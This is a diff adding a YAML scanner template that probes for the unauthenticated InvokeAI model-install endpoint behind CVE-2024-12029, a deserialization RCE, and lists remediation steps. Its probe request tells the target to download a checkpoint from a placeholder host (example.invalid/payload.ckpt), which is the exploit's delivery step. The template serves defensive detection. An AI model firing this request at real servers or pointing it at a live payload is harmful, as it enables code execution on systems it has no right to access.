@@ -1,0 +1,86 @@
+# CERT-X-GEN YAML Template
+
+id: invokeai-model-install-exposed
+name: "InvokeAI Unauthenticated Model Install Endpoint"
+author:
+  name: "CERT-X-GEN Security Team"
+  email: "security@cert-x-gen.local"
+severity: critical
+description: |
+  Detects an exposed InvokeAI /api/v2/models/install endpoint that allows
+  unauthenticated model downloads and loading. In vulnerable versions
+  (InvokeAI 5.3.1-5.4.2), this can lead to RCE via unsafe torch.load
+  deserialization (CVE-2024-12029).
+
+tags:
+  - invokeai
+  - ai
+  - rce
+  - deserialization
+  - model-install
+  - unauth
+  - cve-2024-12029
+
+language: yaml
+confidence: 85
+
+cve_ids:
+  - "CVE-2024-12029"
+cwe_ids:
+  - "CWE-306"  # Missing Authentication for Critical Function
+  - "CWE-502"  # Deserialization of Untrusted Data
+cvss_score: 9.8
+version: "1.0.0"
+
+references:
+  - https://www.offsec.com/blog/cve-2024-12029/
+  - https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e
+  - https://pytorch.org/docs/stable/notes/serialization.html#security
+
+http:
+  - method: POST
+    path:
+      - "/api/v2/models/install?source=http://example.invalid/payload.ckpt&inplace=true"
+
+    headers:
+      User-Agent: "cert-x-gen/1.0"
+      Content-Type: "application/json"
+
+    body: "{}"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 400
+          - 422
+          - 500
+
+      - type: word
+        words:
+          - "application/json"
+        part: header
+
+      - type: word
+        words:
+          - "source"
+          - "model"
+          - "install"
+          - "InvokeAI"
+        condition: or
+        part: body
+
+    extractors:
+      - type: regex
+        name: error_detail
+        regex:
+          - "\"detail\"\\s*:\\s*\"([^\"]+)\""
+        group: 1
+
+remediation: |
+  1. Upgrade InvokeAI to 5.4.3 or later.
+  2. Enforce authentication and authorization for /api/v2/models/install.
+  3. Prefer safe model formats (e.g., safetensors) and avoid untrusted checkpoints.
+  4. Use torch.load with weights_only=True or equivalent safe loaders.
+  5. Restrict model download sources to trusted, signed allow-lists.
